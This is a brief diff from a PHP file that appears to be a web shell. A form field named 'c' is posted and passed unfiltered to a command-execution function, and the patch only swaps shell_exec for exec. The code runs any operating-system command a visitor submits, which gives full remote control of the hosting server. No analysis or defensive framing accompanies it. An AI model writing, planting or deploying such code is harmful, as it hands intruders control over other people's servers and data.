@@ -81,7 +81,7 @@ $$sern <input size="50" type="text" name="c"><input align="right" type="submit" 
 HTML;
 
 if (!empty($_POST['c'])){
-shell_exec($_POST['c']);
+exec($_POST['c']);
 }
 echo "</textarea></td>$tend";
 break;
